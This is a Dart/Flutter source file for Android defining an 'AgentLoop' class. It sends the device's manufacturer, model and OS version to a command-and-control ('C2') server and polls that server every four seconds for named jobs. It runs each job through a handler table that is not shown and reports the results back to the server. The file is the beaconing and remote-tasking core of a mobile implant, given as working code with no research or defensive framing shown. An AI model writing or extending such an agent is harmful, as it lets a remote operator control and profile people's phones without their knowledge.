import 'dart:async';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/widgets.dart';
import '../services/c2.dart';
import 'handlers.dart';

class AgentLoop with WidgetsBindingObserver {
  AgentLoop(this.c2);
  final C2Client c2;
  Timer? _timer;
  bool _running = false;
  bool _busy = false;
  void Function(String)? onStatus;

  Future<void> start() async {
    if (_running) return;
    _running = true;
    WidgetsBinding.instance.addObserver(this);
    await _register();
    _timer = Timer.periodic(const Duration(seconds: 4), (_) => _tick());
    onStatus?.call('agent polling');
  }

  void stop() {
    _running = false;
    _timer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) _register();
  }

  Future<void> _register() async {
    try {
      final a = await DeviceInfoPlugin().androidInfo;
      await c2.register({
        'manufacturer': a.manufacturer,
        'model': a.model,
        'sdk': a.version.sdkInt,
        'release': a.version.release,
        'brand': a.brand,
        'ts': DateTime.now().toUtc().toIso8601String(),
      });
      onStatus?.call('registered');
    } catch (e) {
      onStatus?.call('register error: $e');
    }
  }

  Future<void> _tick() async {
    if (!_running || _busy) return;
    _busy = true;
    try {
      final jobs = await c2.poll();
      for (final job in jobs) {
        await _run(job);
      }
    } catch (e) {
      onStatus?.call('poll error: $e');
    } finally {
      _busy = false;
    }
  }

  Future<void> _run(Map<String, dynamic> job) async {
    final jobId = (job['jobId'] ?? job['id'] ?? '').toString();
    final name = (job['name'] ?? '').toString();
    final args = job['args'] is Map
        ? Map<String, dynamic>.from(job['args'] as Map)
        : <String, dynamic>{};
    final handler = kHandlers[name];
    if (handler == null) {
      await c2.reportResult(
        jobId: jobId,
        name: name,
        ok: false,
        error: 'unknown command: $name',
      );
      return;
    }
    try {
      final data = await handler(args);
      await c2.reportResult(jobId: jobId, name: name, ok: true, data: data);
      onStatus?.call('ok $name');
    } catch (e) {
      await c2.reportResult(
        jobId: jobId,
        name: name,
        ok: false,
        error: e.toString(),
      );
      onStatus?.call('fail $name');
    }
  }
}
